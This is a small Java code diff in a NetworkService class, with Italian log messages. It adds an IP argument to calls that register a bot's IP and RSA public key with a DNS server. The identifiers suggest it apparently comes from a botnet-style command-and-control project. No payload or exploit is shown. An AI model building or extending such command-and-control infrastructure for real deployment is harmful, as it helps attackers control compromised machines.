@@ -271,7 +271,7 @@ public class NetworkService {
 		System.out.println("Connessione con il DNS server....");
 		if (engineBot.isCommandandconquerStatus()) {
 			Boolean result = false;
-			result = cecReq.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());
+			result = cecReq.sendInfoToDnsServer(url, this.ip,this.ip, pki.getPubRSAKey());
 			Pairs<IP, PublicKey> cec = new Pairs<>(getMyIp(), pki.getPubRSAKey());
 			commandConquerIps.add(cec);
 			System.out.println("Ip tornato " + result);
@@ -370,7 +370,7 @@ public class NetworkService {
 		String url = resolveDns(engineBot.getDnsurl());
 		Boolean result = false;
 
-		result = cecReq.sendInfoToDnsServer(url, ip, pk);
+		result = cecReq.sendInfoToDnsServer(url,this.ip,ip, pk);
 		System.out.println("Ip tornato " + result);
 		return result;
 	}
